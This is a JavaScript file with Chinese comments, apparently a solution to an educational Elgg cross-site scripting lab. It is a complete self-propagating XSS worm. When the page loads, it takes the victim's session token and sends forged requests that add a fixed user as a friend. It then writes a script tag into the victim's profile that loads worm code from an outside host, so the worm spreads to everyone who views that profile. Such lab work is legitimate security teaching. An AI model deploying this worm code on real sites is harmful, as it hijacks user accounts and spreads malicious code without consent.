window.onload = function () {
    var Ajax = null;

    // 获取 Elgg 安全令牌和时间戳
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // 构造 HTTP 请求以将 Samy 添加为朋友
    var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
    var samyGuid = 59;
    if (elgg.session.user.guid != samyGuid) {
        // 创建并发送 Ajax 请求以将 Samy 添加为朋友
        Ajax = new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }

    // 自传播：将 Link 方法的蠕虫代码插入到受害者的 About Me 字段中
    // 生成 Link 标签
    var wormCode = "<script type=\"text/javascript\" src=\"http://www.example.com/xss_worm.js\"></" + "script>";
    var encodedWormCode = encodeURIComponent(wormCode);
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;

    // 构造 POST 请求的内容（修改个人资料）
    var sendurlProfile = "http://www.seed-server.com/action/profile/edit";
    var content = token + ts + userName +
                  "&description=" + encodedWormCode + 
                  "&accesslevel[description]=2" + guid;  // 修改 About Me 字段

    // 创建并发送 Ajax 请求以修改个人资料并插入蠕虫
    var AjaxProfile = new XMLHttpRequest();
    AjaxProfile.open("POST", sendurlProfile, true);
    AjaxProfile.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    AjaxProfile.send(content);
};
